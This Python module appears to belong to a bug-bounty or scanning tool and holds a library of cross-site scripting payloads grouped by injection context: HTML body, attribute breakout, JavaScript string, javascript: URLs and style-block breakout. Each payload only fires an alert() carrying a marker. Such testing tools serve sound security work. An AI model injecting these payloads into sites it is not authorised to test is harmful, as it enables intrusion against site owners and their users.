"""
payloads.py — a curated XSS payload library, organized by CONTEXT.

The whole point of context-awareness: a payload that fires inside an HTML text
node is useless inside a JavaScript string, and vice-versa. So we pick payloads
that match *where* our input actually lands.

Every payload is BENIGN — it only pops a harmless `alert()` carrying a unique
marker, which our headless-browser verifier detects. We never use a destructive
payload. This satisfies the 'minimal-impact proof' safety requirement.

Use:
    marker = new_marker()
    for p in payloads_for("attribute", marker):
        ... inject p, then verify the alert(marker) fired ...
"""

from __future__ import annotations

import secrets

# Contexts we recognise (see context.py for how we detect them).
CONTEXTS = ("html_body", "attribute", "js_string", "url", "css")


def new_marker() -> str:
    """A unique, alphanumeric marker that survives most contexts untouched."""
    return "bbp" + secrets.token_hex(4)  # e.g. bbp1a2b3c4d


# Each entry is a template containing {m} for the marker and, where relevant,
# {q} for the quote character that encloses an attribute value.
_TEMPLATES: dict[str, list[str]] = {
    # Input lands as text between tags: inject a fresh element.
    "html_body": [
        "<script>alert('{m}')</script>",
        "<img src=x onerror=alert('{m}')>",
        "<svg onload=alert('{m}')>",
        "<details open ontoggle=alert('{m}')>",
    ],
    # Input lands inside an attribute value quoted by {q}: break out first.
    "attribute": [
        "{q}><script>alert('{m}')</script>",
        "{q}><img src=x onerror=alert('{m}')>",
        "{q} onmouseover=alert('{m}') x={q}",
        "{q} autofocus onfocus=alert('{m}') x={q}",
    ],
    # Input lands inside a JS string literal: close the string / the script.
    "js_string": [
        "';alert('{m}');//",
        "\\';alert('{m}');//",
        "</script><script>alert('{m}')</script>",
        "'-alert('{m}')-'",
    ],
    # Input lands in a URL sink (href/src): use a javascript: URL.
    "url": [
        "javascript:alert('{m}')",
        "javascript:alert('{m}')//",
    ],
    # Input lands inside a <style> block: break out of it.
    "css": [
        "</style><script>alert('{m}')</script>",
        "</style><img src=x onerror=alert('{m}')>",
    ],
}


def payloads_for(context: str, marker: str, quote: str = '"') -> list[str]:
    """Return context-appropriate, benign payloads with the marker baked in."""
    templates = _TEMPLATES.get(context, _TEMPLATES["html_body"])
    out = []
    for tpl in templates:
        out.append(tpl.format(m=marker, q=quote))
    return out


def all_payloads(marker: str, quote: str = '"') -> dict[str, list[str]]:
    """Every context's payloads (used when context detection is inconclusive)."""
    return {ctx: payloads_for(ctx, marker, quote) for ctx in CONTEXTS}


# A single, simple probe value used purely to LOCATE reflections. It is plain
# alphanumeric so it passes through unmangled, letting us see where it lands and
# whether special characters around it are filtered.
def probe_value(marker: str) -> str:
    return marker
